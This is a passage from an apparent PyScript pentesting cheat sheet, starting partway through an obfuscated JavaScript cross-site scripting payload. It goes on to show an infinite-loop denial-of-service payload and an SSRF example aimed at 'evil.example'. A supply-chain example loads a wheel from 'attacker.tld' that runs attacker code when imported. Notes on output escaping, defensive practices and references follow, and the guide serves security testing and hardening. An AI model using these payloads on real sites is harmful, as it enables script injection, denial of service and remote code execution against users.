=\"w\">      </span><span class=\"kd\">var</span><span class=\"w\"> </span><span class=\"nx\">_0x34a15f</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"p\">[</span>\n<span class=\"w\">        </span><span class=\"s2\">&quot;15170376Sgmhnu&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">        </span><span class=\"s2\">&quot;589203pPKatg&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">        </span><span class=\"s2\">&quot;11BaafMZ&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">        </span><span class=\"s2\">&quot;445905MAsUXq&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">        </span><span class=\"s2\">&quot;432bhVZQo&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">        </span><span class=\"s2\">&quot;14792bfmdlY&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">        </span><span class=\"s2\">&quot;4FKyEje&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">        </span><span class=\"s2\">&quot;92890jvCozd&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">        </span><span class=\"s2\">&quot;36031bizdfX&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">        </span><span class=\"s2\">&quot;114QrRNWp&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">        </span><span class=\"s2\">&quot;domain&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">        </span><span class=\"s2\">&quot;3249220MUVofX&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">        </span><span class=\"s2\">&quot;18cpppdr&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">      </span><span class=\"p\">]</span>\n<span class=\"w\">      </span><span class=\"nx\">_0x599c</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"kd\">function</span><span class=\"w\"> </span><span class=\"p\">()</span><span class=\"w\"> </span><span class=\"p\">{</span>\n<span class=\"w\">        </span><span class=\"k\">return</span><span class=\"w\"> </span><span class=\"nx\">_0x34a15f</span>\n<span class=\"w\">      </span><span class=\"p\">}</span>\n<span class=\"w\">      </span><span class=\"k\">return</span><span class=\"w\"> </span><span class=\"nx\">_0x599c</span><span class=\"p\">()</span>\n<span class=\"w\">    </span><span class=\"p\">}</span>\n<span class=\"w\">  </span><span class=\"p\">&lt;/</span><span class=\"nt\">script</span><span class=\"p\">&gt;</span>\n  &quot;&quot;)\n<span class=\"p\">&lt;/</span><span class=\"nt\">py-script</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<p>Result:</p>\n<p><img alt=\"Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Infinity loop)\" src=\"https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png\" /></p>\n<h3 id=\"dos-attack-infinity-loop\">DoS attack (Infinity loop)</h3>\n<p>Code:</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">&lt;</span><span class=\"nt\">py-script</span><span class=\"p\">&gt;</span>\n  while True:\n  print(&quot;<span class=\"ni\">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span>&quot;)\n<span class=\"p\">&lt;/</span><span class=\"nt\">py-script</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<p>Result:</p>\n<p><img alt=\"Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...\" src=\"https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png\" /></p>\n<hr />\n<h2 id=\"new-vulnerabilities-techniques-2023-2025\">New vulnerabilities &amp; techniques (2023-2025)</h2>\n<h3 id=\"server-side-request-forgery-via-uncontrolled-redirects-cve-2025-50182\">Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)</h3>\n<p><code>urllib3 &gt;= 2.2.0, &lt; 2.5.0</code> ignores the <code>redirect</code> and <code>retries</code> request parameters when used with Pyodide's browser transport. If an attacker can influence target URLs, the code may follow cross-domain redirects even when it asks urllib3 to disable them, undermining SSRF defenses.<sup><a href=\"#references\">[1]</a><a href=\"#references\">[4]</a></sup></p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">&lt;</span><span class=\"nt\">script</span> <span class=\"na\">type</span><span class=\"o\">=</span><span class=\"s\">&quot;py&quot;</span><span class=\"p\">&gt;</span>\n<span class=\"k\">import</span><span class=\"w\"> </span><span class=\"nx\">urllib3</span>\n<span class=\"nx\">http</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nx\">urllib3</span><span class=\"p\">.</span><span class=\"nx\">PoolManager</span><span class=\"p\">()</span>\n<span class=\"nx\">r</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"nx\">http</span><span class=\"p\">.</span><span class=\"nx\">request</span><span class=\"p\">(</span>\n<span class=\"w\">    </span><span class=\"s2\">&quot;GET&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"s2\">&quot;https://evil.example/302&quot;</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nx\">retries</span><span class=\"o\">=</span><span class=\"nx\">False</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nx\">redirect</span><span class=\"o\">=</span><span class=\"nx\">False</span><span class=\"p\">,</span>\n<span class=\"p\">)</span><span class=\"w\">  </span><span class=\"err\">#</span><span class=\"w\"> </span><span class=\"nx\">ignored</span><span class=\"w\"> </span><span class=\"nx\">by</span><span class=\"w\"> </span><span class=\"nx\">affected</span><span class=\"w\"> </span><span class=\"nx\">Pyodide</span><span class=\"o\">/</span><span class=\"nx\">browser</span><span class=\"w\"> </span><span class=\"nx\">runtimes</span>\n<span class=\"nx\">print</span><span class=\"p\">(</span><span class=\"nx\">r</span><span class=\"p\">.</span><span class=\"nx\">status</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"nx\">r</span><span class=\"p\">.</span><span class=\"nx\">url</span><span class=\"p\">)</span>\n<span class=\"p\">&lt;/</span><span class=\"nt\">script</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<p>Upgrade to <code>urllib3 &gt;= 2.5.0</code> for Node.js, but do not rely on urllib3 to disable redirects in browsers; validate or allow-list destinations before making requests instead.<sup><a href=\"#references\">[4]</a></sup></p>\n<h3 id=\"arbitrary-package-loading-supply-chain-attacks\">Arbitrary package loading &amp; supply-chain attacks</h3>\n<p>PyScript's Pyodide configuration accepts arbitrary wheel URLs in <code>packages</code>; if an attacker can modify or inject that configuration, a subsequent import can execute attacker-controlled Python in the victim's browser.<sup><a href=\"#references\">[5]</a><a href=\"#references\">[6]</a></sup></p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">&lt;</span><span class=\"nt\">py-config</span><span class=\"p\">&gt;</span>\npackages = [&quot;https://attacker.tld/payload-0.0.1-py3-none-any.whl&quot;]\n<span class=\"p\">&lt;/</span><span class=\"nt\">py-config</span><span class=\"p\">&gt;</span>\n<span class=\"p\">&lt;</span><span class=\"nt\">script</span> <span class=\"na\">type</span><span class=\"o\">=</span><span class=\"s\">&quot;py&quot;</span><span class=\"p\">&gt;</span>\n<span class=\"k\">import</span><span class=\"w\"> </span><span class=\"nx\">payload</span><span class=\"w\">  </span><span class=\"err\">#</span><span class=\"w\"> </span><span class=\"nx\">executes</span><span class=\"w\"> </span><span class=\"nx\">attacker</span><span class=\"o\">-</span><span class=\"nx\">controlled</span><span class=\"w\"> </span><span class=\"nx\">code</span><span class=\"w\"> </span><span class=\"nx\">at</span><span class=\"w\"> </span><span class=\"k\">import</span>\n<span class=\"p\">&lt;/</span><span class=\"nt\">script</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<p>Pyodide can install pure-Python wheels from arbitrary URLs without a WebAssembly build of the package.<sup><a href=\"#references\">[6]</a></sup> Keep this configuration developer-controlled, allow-list exact package names or URLs, and verify remote wheel digests during build or deployment.</p>\n<h3 id=\"output-sanitisation-changes-2023\">Output sanitisation changes (2023+)</h3>\n<ul>\n<li>In the 2022.05.1 implementation used by the legacy examples, <code>print()</code> writes <code>text/plain</code> output without HTML escaping and is therefore XSS-prone.<sup><a href=\"#references\">[8]</a></sup></li>\n<li>The current <code>display()</code> helper <strong>escapes HTML by default</strong> for plain strings; raw markup must be wrapped in <code>pyscript.HTML()</code>.<sup><a href=\"#references\">[2]</a></sup></li>\n</ul>\n<div class=\"highlight\"><pre><span></span><code><span class=\"kn\">from</span> <span class=\"nn\">pyscript</span> <span class=\"kn\">import</span> <span class=\"n\">display</span><span class=\"p\">,</span> <span class=\"n\">HTML</span>\n\n<span class=\"n\">display</span><span class=\"p\">(</span><span class=\"s2\">&quot;&lt;b&gt;escaped&lt;/b&gt;&quot;</span><span class=\"p\">)</span>          <span class=\"c1\"># renders literally</span>\n\n<span class=\"n\">display</span><span class=\"p\">(</span><span class=\"n\">HTML</span><span class=\"p\">(</span><span class=\"s2\">&quot;&lt;b&gt;not-escaped&lt;/b&gt;&quot;</span><span class=\"p\">))</span> <span class=\"c1\"># executes as HTML -&gt; potential XSS if untrusted</span>\n</code></pre></div>\n<p>Use <code>display()</code> for untrusted input and do not pass untrusted strings to <code>HTML()</code>.<sup><a href=\"#references\">[2]</a></sup></p>\n<hr />\n<h2 id=\"defensive-best-practices\">Defensive Best Practices</h2>\n<ul>\n<li><strong>Keep packages up to date</strong> – use <code>urllib3 &gt;= 2.5.0</code> in Node.js and review browser redirect assumptions separately.<sup><a href=\"#references\">[4]</a></sup></li>\n<li><strong>Restrict package sources</strong> – allow-list PyPI names or exact trusted URLs, and verify remote wheel digests during build or deployment.<sup><a href=\"#references\">[5]</a><a href=\"#references\">[6]</a></sup></li>\n<li><strong>Harden Content Security Policy</strong> – disallow inline JavaScript (<code>script-src 'self' 'sha256-…'</code>) so that injected <code>&lt;script&gt;</code> blocks cannot execute.</li>\n<li><strong>Disallow user-supplied <code>&lt;py-script&gt;</code> / <code>&lt;script type=\"py\"&gt;</code> tags</strong> – sanitise HTML on the server before echoing it back to other users.</li>\n<li><strong>Isolate workers</strong> – if you do not need synchronous access to the DOM from workers, enable the <code>sync_main_only</code> flag to avoid <code>SharedArrayBuffer</code> and its associated CORS header requirements.<sup><a href=\"#references\">[5]</a></sup></li>\n</ul>\n<h2 id=\"references\">References</h2>\n<ul>\n<li>[1] <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-50182\">NVD – CVE-2025-50182</a></li>\n<li>[2] <a href=\"https://docs.pyscript.net/2024.6.1/user-guide/builtins/\">PyScript Built-ins documentation – <code>display</code> &amp; <code>HTML</code></a></li>\n<li>[3] <a href=\"https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript\">Cyber Guy - The Art of Vulnerability Chaining (PyScript)</a></li>\n<li>[4] <a href=\"https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5\">urllib3 security advisory – CVE-2025-50182</a></li>\n<li>[5] <a href=\"https://docs.pyscript.net/2026.7.3/user-guide/configuration/\">PyScript configuration documentation – packages and <code>sync_main_only</code></a></li>\n<li>[6] <a href=\"https://pyodide.org/en/stable/usage/loading-packages.html\">Pyodide – Loading packages</a></li>\n<li>[7] <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-30286\">NVD – CVE-2022-30286</a></li>\n<li>[8] <a href=\"https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py\">PyScript 2022.05.1 <code>pyscript.py</code> implementation</a></li>\n</ul>", "excerpt": "Pyscript PyScript Pentesting Guide PyScript is a new framework developed for integrating Python into HTML so, it can be used alongside HTML. In this cheat sheet, you'll find how to use PyScript for yo", "tags": []}